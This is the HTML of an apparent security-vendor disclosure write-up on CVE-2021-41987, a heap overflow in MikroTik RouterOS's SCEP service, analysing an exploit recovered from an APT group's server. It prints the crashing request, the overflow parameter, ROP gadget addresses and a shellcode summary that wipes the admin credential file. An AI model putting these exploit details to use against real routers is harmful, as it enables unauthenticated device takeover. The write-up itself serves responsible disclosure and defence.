<!DOCTYPE html><html><head><meta charSet="utf-8"/><style>
      body {
        font-family: &#x27;__Noto_Sans_8f18ec&#x27;, &#x27;__Noto_Sans_Fallback_8f18ec&#x27;, &#x27;Lato&#x27;, sans-serif;
      }
      </style><link rel="alternate" hrefLang="en-US" href="https://teamt5.org/en/posts/vulnerability-mikrotik-cve-2021-41987/"/><meta name="viewport" content="width=device-width, initial-scale=1"/><title>Vulnerability Exposure &amp; Notification on Mikrotik (CVE-2021-41987)  - TeamT5</title><meta name="description" content="## Brief
In 2021, we discovered an open directory on Huapiâs C2. We found the source code contained an exploit aiming at Mikrotik routers. More specifically, our analysis found that the exploit would allow the attackers to send specially crafted payloads to achieve Remote Code Execution (RCE) via WAN without any authentications. The targeted RouterOS products include mikrotik-tile-6.46.8, mikrotik-vm-64.8, and mikrotik-vm-6.48.

TeamT5 alerted Mikrotik to patch this vulnerability upon discovery. The patch for this vulnerability was released on 2021/11/17 and can be downloaded from the official Mikrotik website. All affected organizations should update their RouterOS immediately to avoid actorsâ exploitation.

HUAPI (aka BlackTech, Palmerworm, or PLEAD) has been active since 2007 and has been targeting Taiwan for over a decade. Huapiâs malwares are highly sophisticated, and some of them use unique anti-analysis packers. Some of Huapiâs malware utilized a modified RC4 algorithm to encrypt the malicious C2 communication. Huapi focused on governmental entities, technology or telecommunication industries, and think tanks. Our observation suggested that over half of the victims were governmental agencies in Taiwan, the United States, Japan, and South Korea.

### Attack vector
As a powerful and easy-to-use router, Mikrotik routerboard supports SCEP (Simple Certificate Enrollment Protocol), a service that was designed for simple certificate delivery. During transport, the binary data is encoded in Base64 via HTTP GET. Unfortunately, when processing the data from the payload, a miscalculation may occur if the payload is not properly formatted, potentially resulting in a Heap-based Buffer Overflow.

The open directory we had discovered contained exploit code that targeted ```mikrotik-tile-6.46.8```, ```mikrotik-vm-64.8``` and ```mikrotik-vm-6.48```, along with their corresponding shellcode snippets. In the following sections, we will be analyzing the exploit code that was designed for ```mikrotik-vm-6.46.8```.

#### Root cause analysis
By sending the following payload, we can cause the service ```www``` to crash and potentially trigger a Heap-based Buffer Overflow.

 ```GET /scep/{scep_server_name}?operation=PKIOperation&amp;message={} HTTP/1.1\r\n```

The crash can be traced back to the function ```base64Decode```, located under ```ScepRequest::parseRequest``` from ```/nova/lib/www/scep.p```. When unpacking the Base64 request, the following code is used to calculate the output buffer size,

```output_buffer_length = 3 * (input_buffer_length &gt;&gt; 2)```

â¦which may cause a miscalculation of the output buffer, resulting in an insufficient memory allocation from ```malloc```, leading to a heap overflow.

![Mikrotik 1.png](https://uploads.teamt5.org/upload/original/pic1_vulnerability-mikrotik-cve-2021-41987.png)


#### What happened?

For instance, we assume that the our input data is ```xxxxxxxxxxxxxxxxhCE```, and the length of input buffer is 19. Based on the decompiled code, ```out_len = 3 * (input_len &gt;&gt; 2)``` which is ```out_len = 3 * (input_len // 4)``` (double slashes represent integer division), thereby allocating 12 bytes as decoded data buffer. However, the decoded data buffer should be 14 bytes instead of 12. This oversight allows the attacker to overwrite data in heap.

#### Overview of the exploit flow
According to the chunk-recycling mechanism, by overwriting the chunk size of a chunk in bins to a larger value (```0x4121```), the next ```malloc``` call will return a heap chunk overlapped with allocated chunks. This will lead to a heap overflow when writing to the chunk.

The part which will be overwritten is a vtable pointer in a destructor (```sub_8052E90```) function, and by setting the register ```edx``` to ```0x8061a74```, the instruction ```call [edx+4]``` will execute the gadget at ```0x8058e89``` ( ```xchg eax, ebp; ret;``` ) and execute the shellcode after pivoting the stack to the attacker-owned buffer.

![Mikrotik 2.png](https://uploads.teamt5.org/upload/original/pic2_vulnerability-mikrotik-cve-2021-41987.png)


#### Heap spray
The attacker can begin heap spraying by requesting 64 concurrent connections, and close some of them in order to let the vtable pointer be overwriten by the heap overflow later.

![Mikrotik 3.png](https://uploads.teamt5.org/upload/original/pic3_vulnerability-mikrotik-cve-2021-41987.png)

The function ```aaaa``` assembles the ROP gadgets, and the variable ```sc``` contains the shellcode for execution.
![Mikrotik 4.png](https://uploads.teamt5.org/upload/original/pic4_vulnerability-mikrotik-cve-2021-41987.png)

#### Trigger heap overflow
The function ```bbbb``` sends the payloads to the victim server in the aforementioned format.

![Mikrotik 5.png](https://uploads.teamt5.org/upload/original/pic5_vulnerability-mikrotik-cve-2021-41987.png)
![Mikrotik 6.png](https://uploads.teamt5.org/upload/original/pic6_vulnerability-mikrotik-cve-2021-41987.png)

The parameter message (```&#x27;x&#x27;*801*4+&#x27;hCE&#x27;```) in the function ```bbbb``` will overwrite the size of next chunk. Here in gdb , it shows that the parameter message has been decoded to ```c7 1c 71 84 21``` at ```0x80859f0```, and the last byte ```\x21``` has been written as the next chunk size at ```0x80859f4```.

![Mikrotik 7.png](https://uploads.teamt5.org/upload/original/pic7_vulnerability-mikrotik-cve-2021-41987.png)

#### Attempting to retrieve the oversized chunk on heap
![Mikrotik 8.png](https://uploads.teamt5.org/upload/original/pic8_vulnerability-mikrotik-cve-2021-41987.png)

In order to retrieve the overflowed chunk, we need to send out more request. At some point, the register ```edx``` will be set to ```0x8061a74``` when the attempt reaches ```i=3```.

![Mikrotik 9.png](https://uploads.teamt5.org/upload/original/pic9_vulnerability-mikrotik-cve-2021-41987.png)

#### Trigger destructor
The final step of the exploit, set off destructor  ```call [edx+4]``` by closing connections.
![Mikrotik 10.png](https://uploads.teamt5.org/upload/original/pic10_vulnerability-mikrotik-cve-2021-41987.png)

#### Fingers crossed
Thanks to the heap spraying at the initial phase of the exploit, the data in the address ```0x8061a74``` will be modified, thus the instruction ```call [edx+4]``` will end up calling ```0x8058e89``` instead (the address of gadget ```xchg eax, ebp; ret;```) and start executing our gadgets.

![Mikrotik 11.png](https://uploads.teamt5.org/upload/original/pic11_vulnerability-mikrotik-cve-2021-41987.png)

Once the gadgets have been hit, ```0x8058e89: xchg eax, ebp; ret``` and ```0x8052eb9: leave``` will allow us to pivot from the stack to the controllable buffer and start to execute our ROP chain from ```0x804fbfc```.

The ROP chain will try to increase the address of ```open``` to the address of ```mprotect```, and the ```0x804fc04: pop esp; ret;``` will set ```esp``` to ```0x8061a74+8``` to wrap up the ROP chain. Lastly, calling ```mprotect``` and jump right into the shellcode (```0x8061674```).

![Mikrotik 12.png](https://uploads.teamt5.org/upload/original/pic12_vulnerability-mikrotik-cve-2021-41987.png)

In the exploit, the shellcode can be interpreted as ```unlink(&#x27;/nova/store/user.data&#x27;) + sync() + reboot()```, after the target device has finished rebooting. The attacker should then be able to login into web service as admin without a password.

### Conclusion
To wrap up, letâs go over the exploit code once again:

**1. Low stability**

- Since ```add()``` does not work in our favor and that ASLR is enabled by default, the exploit chain may fail on the first try.
- Occasionally, even though the ```/nova/store/user.dat``` file will be deleted, the device does not end up rebooting. The shellcode may require extra improvements to make it more stable.
- Even in best case scenario, the success rate is only about 5~6%.
- Thankfully, in the event where the attack attempt fails, the watchdog process will restart the ```www``` service for us. This ensures stability and allows the attacker to not cause noticeable disruption during the attack.

**2. Strict prerequisites**

- The attacker must be aware of the path name ```scep_server_name``` before being able to begin such attack.

**3. Disclosure Timeline**

```2021/07/11```: Acquire exploit codes from the open directory

```2021/10/04```: Responsible disclosure to Mikrotik and reserved CVE-2021-41987

```2021/11/17```: Official patch released

```2022/03/01```: Full disclosure released

**4. Affected versions of RouterOS**
- ```6.46.8```
- ```6.47.9```
- ```6.47.10```

### About TeamT5 D39
D39 is committed to the field of vulnerability security and vulnerability discovery. The research scope includes systems and devices that are connected to the Internet, such as mobile devices, IoT devices, Linux, and Windows. Our team has held a number of critical or important vulnerabilities and has conducted presentations across various major security conferences, such as Blackhat, HITCON, etc.

Exploit research has always been one of the most advanced fields in network attack and defense. TeamT5 expects to invest resources to cultivate more talents to enter this field, and expects to have more and more world-leading vulnerability research talents in Taiwan. We welcome those who dare to face unknown challenges, are committed to vulnerability research and discovery, and have independent research capabilities to join us. ð¤

### Reference
- https://wiki.mikrotik.com/wiki/Manual:System/Certificates
- https://en.wikipedia.org/wiki/Base64

*Image courtesy of Pixabay"/><meta name="keywords" content="TeamT5, ThreatSonar Anti-Ransomware, ThreatSonar, ThreatVision, cyber espionage, APT, ransomware, ransom virus, TT, Cyber Threat Hunters, cyber espionage solutions, threat analysis service, incident response, investigation services, threat intelligence"/><meta name="thumbnail" content="https://uploads.teamt5.org/upload/original/mikrotik_banner_lava.jpg"/><meta property="og:type" content="website"/><meta property="og:title" content="Vulnerability Exposure &amp; Notification on Mikrotik (CVE-2021-41987)  - TeamT5"/><meta property="og:description" content="## Brief
In 2021, we discovered an open directory on Huapiâs C2. We found the source code contained an exploit aiming at Mikrotik routers. More specifically, our analysis found that the exploit would allow the attackers to send specially crafted payloads to achieve Remote Code Execution (RCE) via WAN without any authentications. The targeted RouterOS products include mikrotik-tile-6.46.8, mikrotik-vm-64.8, and mikrotik-vm-6.48.

TeamT5 alerted Mikrotik to patch this vulnerability upon discovery. The patch for this vulnerability was released on 2021/11/17 and can be downloaded from the official Mikrotik website. All affected organizations should update their RouterOS immediately to avoid actorsâ exploitation.

HUAPI (aka BlackTech, Palmerworm, or PLEAD) has been active since 2007 and has been targeting Taiwan for over a decade. Huapiâs malwares are highly sophisticated, and some of them use unique anti-analysis packers. Some of Huapiâs malware utilized a modified RC4 algorithm to encrypt the malicious C2 communication. Huapi focused on governmental entities, technology or telecommunication industries, and think tanks. Our observation suggested that over half of the victims were governmental agencies in Taiwan, the United States, Japan, and South Korea.

### Attack vector
As a powerful and easy-to-use router, Mikrotik routerboard supports SCEP (Simple Certificate Enrollment Protocol), a service that was designed for simple certificate delivery. During transport, the binary data is encoded in Base64 via HTTP GET. Unfortunately, when processing the data from the payload, a miscalculation may occur if the payload is not properly formatted, potentially resulting in a Heap-based Buffer Overflow.

The open directory we had discovered contained exploit code that targeted ```mikrotik-tile-6.46.8```, ```mikrotik-vm-64.8``` and ```mikrotik-vm-6.48```, along with their corresponding shellcode snippets. In the following sections, we will be analyzing the exploit code that was designed for ```mikrotik-vm-6.46.8```.

#### Root cause analysis
By sending the following payload, we can cause the service ```www``` to crash and potentially trigger a Heap-based Buffer Overflow.

 ```GET /scep/{scep_server_name}?operation=PKIOperation&amp;message={} HTTP/1.1\r\n```

The crash can be traced back to the function ```base64Decode```, located under ```ScepRequest::parseRequest``` from ```/nova/lib/www/scep.p```. When unpacking the Base64 request, the following code is used to calculate the output buffer size,

```output_buffer_length = 3 * (input_buffer_length &gt;&gt; 2)```

â¦which may cause a miscalculation of the output buffer, resulting in an insufficient memory allocation from ```malloc```, leading to a heap overflow.

![Mikrotik 1.png](https://uploads.teamt5.org/upload/original/pic1_vulnerability-mikrotik-cve-2021-41987.png)


#### What happened?

For instance, we assume that the our input data is ```xxxxxxxxxxxxxxxxhCE```, and the length of input buffer is 19. Based on the decompiled code, ```out_len = 3 * (input_len &gt;&gt; 2)``` which is ```out_len = 3 * (input_len // 4)``` (double slashes represent integer division), thereby allocating 12 bytes as decoded data buffer. However, the decoded data buffer should be 14 bytes instead of 12. This oversight allows the attacker to overwrite data in heap.

#### Overview of the exploit flow
According to the chunk-recycling mechanism, by overwriting the chunk size of a chunk in bins to a larger value (```0x4121```), the next ```malloc``` call will return a heap chunk overlapped with allocated chunks. This will lead to a heap overflow when writing to the chunk.

The part which will be overwritten is a vtable pointer in a destructor (```sub_8052E90```) function, and by setting the register ```edx``` to ```0x8061a74```, the instruction ```call [edx+4]``` will execute the gadget at ```0x8058e89``` ( ```xchg eax, ebp; ret;``` ) and execute the shellcode after pivoting the stack to the attacker-owned buffer.

![Mikrotik 2.png](https://uploads.teamt5.org/upload/original/pic2_vulnerability-mikrotik-cve-2021-41987.png)


#### Heap spray
The attacker can begin heap spraying by requesting 64 concurrent connections, and close some of them in order to let the vtable pointer be overwriten by the heap overflow later.

![Mikrotik 3.png](https://uploads.teamt5.org/upload/original/pic3_vulnerability-mikrotik-cve-2021-41987.png)

The function ```aaaa``` assembles the ROP gadgets, and the variable ```sc``` contains the shellcode for execution.
![Mikrotik 4.png](https://uploads.teamt5.org/upload/original/pic4_vulnerability-mikrotik-cve-2021-41987.png)

#### Trigger heap overflow
The function ```bbbb``` sends the payloads to the victim server in the aforementioned format.

![Mikrotik 5.png](https://uploads.teamt5.org/upload/original/pic5_vulnerability-mikrotik-cve-2021-41987.png)
![Mikrotik 6.png](https://uploads.teamt5.org/upload/original/pic6_vulnerability-mikrotik-cve-2021-41987.png)

The parameter message (```&#x27;x&#x27;*801*4+&#x27;hCE&#x27;```) in the function ```bbbb``` will overwrite the size of next chunk. Here in gdb , it shows that the parameter message has been decoded to ```c7 1c 71 84 21``` at ```0x80859f0```, and the last byte ```\x21``` has been written as the next chunk size at ```0x80859f4```.

![Mikrotik 7.png](https://uploads.teamt5.org/upload/original/pic7_vulnerability-mikrotik-cve-2021-41987.png)

#### Attempting to retrieve the oversized chunk on heap
![Mikrotik 8.png](https://uploads.teamt5.org/upload/original/pic8_vulnerability-mikrotik-cve-2021-41987.png)

In order to retrieve the overflowed chunk, we need to send out more request. At some point, the register ```edx``` will be set to ```0x8061a74``` when the attempt reaches ```i=3```.

![Mikrotik 9.png](https://uploads.teamt5.org/upload/original/pic9_vulnerability-mikrotik-cve-2021-41987.png)

#### Trigger destructor
The final step of the exploit, set off destructor  ```call [edx+4]``` by closing connections.
![Mikrotik 10.png](https://uploads.teamt5.org/upload/original/pic10_vulnerability-mikrotik-cve-2021-41987.png)

#### Fingers crossed
Thanks to the heap spraying at the initial phase of the exploit, the data in the address ```0x8061a74``` will be modified, thus the instruction ```call [edx+4]``` will end up calling ```0x8058e89``` instead (the address of gadget ```xchg eax, ebp; ret;```) and start executing our gadgets.

![Mikrotik 11.png](https://uploads.teamt5.org/upload/original/pic11_vulnerability-mikrotik-cve-2021-41987.png)

Once the gadgets have been hit, ```0x8058e89: xchg eax, ebp; ret``` and ```0x8052eb9: leave``` will allow us to pivot from the stack to the controllable buffer and start to execute our ROP chain from ```0x804fbfc```.

The ROP chain will try to increase the address of ```open``` to the address of ```mprotect```, and the ```0x804fc04: pop esp; ret;``` will set ```esp``` to ```0x8061a74+8``` to wrap up the ROP chain. Lastly, calling ```mprotect``` and jump right into the shellcode (```0x8061674```).

![Mikrotik 12.png](https://uploads.teamt5.org/upload/original/pic12_vulnerability-mikrotik-cve-2021-41987.png)

In the exploit, the shellcode can be interpreted as ```unlink(&#x27;/nova/store/user.data&#x27;) + sync() + reboot()```, after the target device has finished rebooting. The attacker should then be able to login into web service as admin without a password.

### Conclusion
To wrap up, letâs go over the exploit code once again:

**1. Low stability**

- Since ```add()``` does not work in our favor and that ASLR is enabled by default, the exploit chain may fail on the first try.
- Occasionally, even though the ```/nova/store/user.dat``` file will be deleted, the device does not end up rebooting. The shellcode may require extra improvements to make it more stable.
- Even in best case scenario, the success rate is only about 5~6%.
- Thankfully, in the event where the attack attempt fails, the watchdog process will restart the ```www``` service for us. This ensures stability and allows the attacker to not cause noticeable disruption during the attack.

**2. Strict prerequisites**

- The attacker must be aware of the path name ```scep_server_name``` before being able to begin such attack.

**3. Disclosure Timeline**

```2021/07/11```: Acquire exploit codes from the open directory

```2021/10/04```: Responsible disclosure to Mikrotik and reserved CVE-2021-41987

```2021/11/17```: Official patch released

```2022/03/01```: Full disclosure released

**4. Affected versions of RouterOS**
- ```6.46.8```
- ```6.47.9```
- ```6.47.10```

### About TeamT5 D39
D39 is committed to the field of vulnerability security and vulnerability discovery. The research scope includes systems and devices that are connected to the Internet, such as mobile devices, IoT devices, Linux, and Windows. Our team has held a number of critical or important vulnerabilities and has conducted presentations across various major security conferences, such as Blackhat, HITCON, etc.

Exploit research has always been one of the most advanced fields in network attack and defense. TeamT5 expects to invest resources to cultivate more talents to enter this field, and expects to have more and more world-leading vulnerability research talents in Taiwan. We welcome those who dare to face unknown challenges, are committed to vulnerability research and discovery, and have independent research capabilities to join us. ð¤

### Reference
- https://wiki.mikrotik.com/wiki/Manual:System/Certificates
- https://en.wikipedia.org/wiki/Base64

*Image courtesy of Pixabay"/><meta property="og:url" content="https://teamt5.org/enposts/vulnerability-mikrotik-cve-2021-41987"/><meta property="og:image" content="https://uploads.teamt5.org/upload/original/mikrotik_banner_lava.jpg"/><meta property="twitter:card" content="summary_large_image"/><meta property="fb:pages" content="100503578551035"/><script type="application/ld+json">{"@context":"https://schema.org","@type":"NewsArticle","headline":"Mikrotik æ¼æ´æ­é²èéå ± (CVE-2021-41987)","mainEntityOfPage":"https://teamt5.org/enposts/vulnerability-mikrotik-cve-2021-41987","image":["https://uploads.teamt5.org/upload/original/mikrotik_banner_lava.jpg"],"author":{"@type":"Organization","name":"D39","url":"https://teamt5.org"},"datePublished":"2022-03-01T12:00:00.000Z","dateModified":"2024-12-13T08:29:36.901Z","inLanguage":"en-US","availableLanguage":[{"@type":"Language","name":"zh-TW","url":"https://teamt5.org/tw/posts/vulnerability-mikrotik-cve-2021-41987"},{"@type":"Language","name":"jp-JP","url":"https://teamt5.org/jp/posts/vulnerability-mikrotik-cve-2021-41987"}],"publisher":{"@type":"Organization","name":"TeamT5","url":"https://teamt5.org","logo":"https://legacy-uploads.teamt5.org/assets/common/logo_contact_mqdew8.svg"}}</script><meta name="next-head-count" content="16"/><meta name="facebook-domain-verification" content="ud6xuazjca17uowsk65p2jrevtvosd"/><link rel="preconnect" href="https://uploads.teamt5.org"/><link rel="preconnect" href="https://legacy-uploads.teamt5.org"/><link rel="shortcut icon" href="/favicon.ico" type="image/vnd.microsoft.icon"/><link rel="icon" href="/favicon.ico" type="image/vnd.microsoft.icon"/><script>
  (function(w, d, s, l, i) {
    w[l] = w[l] || [];
    w[l].push({
      'gtm.start': new Date().getTime(),
      event: 'gtm.js'
    });
    var f = d.getElementsByTagName(s)[0],
        j = d.createElement(s),
        dl = l != 'dataLayer' ? '&l=' + l : '';
    j.async = true;
    j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
    f.parentNode.insertBefore(j, f);
  })(window, document, 'script', 'dataLayer', 'GTM-WR86PGC');
</script><link data-next-font="size-adjust" rel="preconnect" href="/" crossorigin="anonymous"/><link rel="preload" href="/_next/static/css/d06e879731880509.css" as="style"/><link rel="stylesheet" href="/_next/static/css/d06e879731880509.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-9dd8e85451173726.js" defer=""></script><script src="/_next/static/chunks/framework-f29e48ae95cae5a3.js" defer=""></script><script src="/_next/static/chunks/main-f976f85708f27d83.js" defer=""></script><script src="/_next/static/chunks/pages/_app-0ab5e6695cad4536.js" defer=""></script><script src="/_next/static/chunks/a29ae703-4c13fcf3bb39e233.js" defer=""></script><script src="/_next/static/chunks/1346-a102870e0fb37ab4.js" defer=""></script><script src="/_next/static/chunks/9097-0197baced49eb1fa.js" defer=""></script><script src="/_next/static/chunks/1380-170b9a7c2539e92f.js" defer=""></script><script src="/_next/static/chunks/1208-d24056f44a93970c.js" defer=""></script><script src="/_next/static/chunks/3332-6d20d742f10461bc.js" defer=""></script><script src="/_next/static/chunks/641-73c201a88bfa9873.js" defer=""></script><script src="/_next/static/chunks/6214-67ab896928f20108.js" defer=""></script><script src="/_next/static/chunks/6911-0e0a194f69c1e93b.js" defer=""></script><script src="/_next/static/chunks/1407-48c99febd0323c84.js" defer=""></script><script src="/_next/static/chunks/pages/%5Blang%5D/posts/%5Buid%5D-76037f19473d0194.js" defer=""></script><script src="/_next/static/XqbxkheTUZP7LNf4QrEFV/_buildManifest.js" defer=""></script><script src="/_next/static/XqbxkheTUZP7LNf4QrEFV/_ssgManifest.js" defer=""></script><style data-emotion="css ertzby 12go95f i1vapn 126i2w1 m0eduh cqhf6t 1h1q0ci 1sohte5 111xtv1 gzr7f8 1nj95pn cunqya vfpk1v 1lbeicl 1nm3lkf 178e6ze 9a6mq4 uedwmp 11c06vz 6oinjq 1hppjzv 1o5a0rv ca69m1 s7eam4 1yp618h uubvgk qv0uab 1vihqh6 xx1j5w w9vsuy sn55je cyopkh 1lt8ec3 1goxo4s sfpfes 1kwq295 1d9e2gf 2itsev 1shon4x 13gtdbe fk0xdk 1jw0r0q zsv9kv 1na388z 1blv94u jf1sy cssveg 13vfu4w 153ic13 1h5x3dy 8sr13a d8p5rg 1g3s13r 1fv32bs 142ads6 1990h1p 1nf81nc ric4bx hwlzfs 9e4kxr wpfswj 19e4vf0 yp163g skxmla jm310z 1sjdpqx 1nevcxy 1uwy6if cd9ufl gb53pj 10t5c7o ijwcic eiy7tu ox4vyo v7iset 1ipix51 1sf8wwi 11u74fh qdphv9 73ect7 edbnnu 1xbxfgz glrwwq 1ntlumm 1s7wsad 1dnxym2 1xwdimk 1diy1ct znbnvb 5hidgr rn9eoi xaihop rtde4j yx8k1m k48dnj up98ca sz4o 1kmzmc6 1l12noq 1rxodi3 1dskh0x 46brdi 1nrt9o1 1hklc6p 13ppfsu 1s0eqit 11h3arz">*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}body{margin:0;padding:0;background-color:#F5F2E9;font-size:12px;}ol,ul{list-style:none;}ul{margin:0;padding:0;}button{margin:0;padding:0;background-color:#F5F2E9;}button:focus{outline:none;}a{color:unset;-webkit-text-decoration:none;text-decoration:none;}h1{font-size:30px;}h2{font-size:28px;}h3{font-size:24px;}h4{font-size:22px;}h5{font-size:20px;}h6{font-size:16px;}loading-mask.expanded{-webkit-transform:translateX(500%);-moz-transform:translateX(500%);-ms-transform:translateX(500%);transform:translateX(500%);}.invisible{visibility:hidden;}.grecaptcha-badge{visibility:hidden;}.css-12go95f{position:fixed;top:50vh;left:50%;-webkit-transform:translate(-50%, 0);-moz-transform:translate(-50%, 0);-ms-transform:translate(-50%, 0);transform:translate(-50%, 0);}.css-i1vapn{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;overflow:hidden;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;height:70px;font-size:16px;padding:13px 16px;text-align:center;z-index:11;position:relative;border-bottom:2px solid #4c433f;color:#FFF;}@media screen and (min-width: 768px){.css-i1vapn{height:46px;padding:12px 0;}}.css-i1vapn img{max-width:100%;}.css-126i2w1{position:relative;height:24px;cursor:pointer;}.css-126i2w1.navbar{margin:30px auto;}@media screen and (min-width: 1280px){.css-126i2w1.navbar{margin-right:40px;}}.css-m0eduh.light path{fill:#FFF;}.css-cqhf6t.light path{fill:#FFF;}.css-cqhf6t.active{-webkit-transform:rotate(180deg);-moz-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg);}.css-cqhf6t.footer{-webkit-transform:rotate(180deg);-moz-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg);}.css-cqhf6t.footer.active{-webkit-transform:rotate(0deg);-moz-transform:rotate(0deg);-ms-transform:rotate(0deg);transform:rotate(0deg);}.css-1h1q0ci{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;width:100%;}.css-1h1q0ci p{margin:0 6px;}.css-1h1q0ci p.light{color:#FFF;}.css-1sohte5{display:inline-block;width:120px;height:80px;-webkit-transform:scale(1);-moz-transform:scale(1);-ms-transform:scale(1);transform:scale(1);overflow:hidden;}.css-1sohte5 img{width:100%;height:100%;-webkit-transition:-webkit-transform 1s cubic-bezier(0.165, 0.84, 0.44, 1);transition:transform 1s cubic-bezier(0.165, 0.84, 0.44, 1);}.css-111xtv1{width:100%;border-bottom:1px solid #C8BDB8;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;}@media screen and (min-width: 1280px){.css-111xtv1{width:auto;height:100%;border:0;}}.css-gzr7f8{height:80px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;font-size:16px;}.css-gzr7f8.dark{color:#4C433F;}.css-gzr7f8.light{color:#FFF;}.css-gzr7f8.active,.css-gzr7f8:hover{color:#D93751;}.css-gzr7f8.active svg,.css-gzr7f8:hover svg{fill:#D93751;}@media screen and (min-width: 1280px){.css-gzr7f8{position:relative;left:calc(36px / 2);-webkit-transition:color 0.3s;transition:color 0.3s;padding-right:36px;}.css-gzr7f8.active:after{content:'';width:calc(100% - 36px);height:6px;background-color:#D93751;position:absolute;bottom:0;}}.css-1nj95pn{width:100%;top:100%;right:0;pointer-events:none;}.css-1nj95pn.active{pointer-events:inherit;}@media screen and (min-width: 1280px){.css-1nj95pn{padding:0 10px;position:absolute;right:30px;}}.css-cunqya{width:100%;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-flex-wrap:wrap;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;}.css-cunqya a{width:100%;}@media screen and (min-width: 1280px){@supports (display: grid){.css-cunqya{display:grid;grid-template-columns:repeat(2, auto);}.css-cunqya >*:not(:nth-child(1)):not(:nth-child(2)){margin-top:20px;}}}.css-vfpk1v{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;margin:0;background-color:#FFF;font-size:14px;}@media (hover: hover){.css-vfpk1v:hover .dropdown-item-image img{-webkit-transform:scale(1.2);-moz-transform:scale(1.2);-ms-transform:scale(1.2);transform:scale(1.2);}}@media screen and (min-width: 1280px){.css-vfpk1v{width:435px;margin-right:20px;}}.css-1lbeicl{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;gap:8px;width:calc(100% - 120px - 40px);padding:0 20px;}.css-1nm3lkf{color:#4C433F;margin:0;}.css-178e6ze{margin:0 20px 0 0;}.css-178e6ze svg{width:23px;height:23px;}.css-9a6mq4{cursor:pointer;height:80px;}.css-9a6mq4 svg{width:80px;height:80px;-webkit-transition:width 0.3s,height 0.3s;transition:width 0.3s,height 0.3s;}.css-9a6mq4 svg rect{width:100%;height:100%;fill:#D93751;}.css-9a6mq4.shrunk{height:50px;}.css-9a6mq4.shrunk svg{width:50px;height:50px;}@media screen and (min-width: 1280px){.css-9a6mq4.shrunk{height:60px;}.css-9a6mq4.shrunk svg{width:60px;height:60px;}}.css-uedwmp{-webkit-transform:translate(42px, 34px);-moz-transform:translate(42px, 34px);-ms-transform:translate(42px, 34px);transform:translate(42px, 34px);-webkit-transition:opacity 0.3s,-webkit-transform 0.3s;transition:opacity 0.3s,transform 0.3s;}.css-uedwmp.shrunk{-webkit-transform:translate(28px, 28px) scale(1.5, 1.584);-moz-transform:translate(28px, 28px) scale(1.5, 1.584);-ms-transform:translate(28px, 28px) scale(1.5, 1.584);transform:translate(28px, 28px) scale(1.5, 1.584);}.css-11c06vz{opacity:1;-webkit-transform:translate(38px, 94.39px);-moz-transform:translate(38px, 94.39px);-ms-transform:translate(38px, 94.39px);transform:translate(38px, 94.39px);-webkit-transition:opacity 0.3s,-webkit-transform 0.3s;transition:opacity 0.3s,transform 0.3s;}.css-11c06vz.shrunk{opacity:0;-webkit-transform:translate(38px, 94.39px);-moz-transform:translate(38px, 94.39px);-ms-transform:translate(38px, 94.39px);transform:translate(38px, 94.39px);}.css-6oinjq{width:30px;height:30px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;position:relative;-webkit-transition:all 0.5s ease-in-out;transition:all 0.5s ease-in-out;cursor:pointer;}.css-6oinjq svg{width:24px;height:24px;position:relative;}.css-6oinjq svg rect{width:20px;height:2px;-webkit-transition:all 0.5s ease-in-out;transition:all 0.5s ease-in-out;}.css-6oinjq svg rect:nth-child(3){transform-origin:center;}.css-6oinjq.dark svg rect{fill:#4C433F;}.css-6oinjq.light svg rect{fill:#FFF;}.css-6oinjq.active svg rect:nth-child(1){-webkit-transform:translate(8px, -1.5px) rotate(45deg);-moz-transform:translate(8px, -1.5px) rotate(45deg);-ms-transform:translate(8px, -1.5px) rotate(45deg);transform:translate(8px, -1.5px) rotate(45deg);}.css-6oinjq.active svg rect:nth-child(2){opacity:0;}.css-6oinjq.active svg rect:nth-child(3){-webkit-transform:translate(-4px, -3.5px) rotate(-45deg);-moz-transform:translate(-4px, -3.5px) rotate(-45deg);-ms-transform:translate(-4px, -3.5px) rotate(-45deg);transform:translate(-4px, -3.5px) rotate(-45deg);}.css-1hppjzv{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}.css-1o5a0rv{position:-webkit-sticky;position:sticky;top:0;z-index:10;}.css-ca69m1{height:80px;width:100%;position:absolute;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-transition:height 0.3s;transition:height 0.3s;}.css-ca69m1.shrunk{height:50px;background-color:#FFF;}@media screen and (min-width: 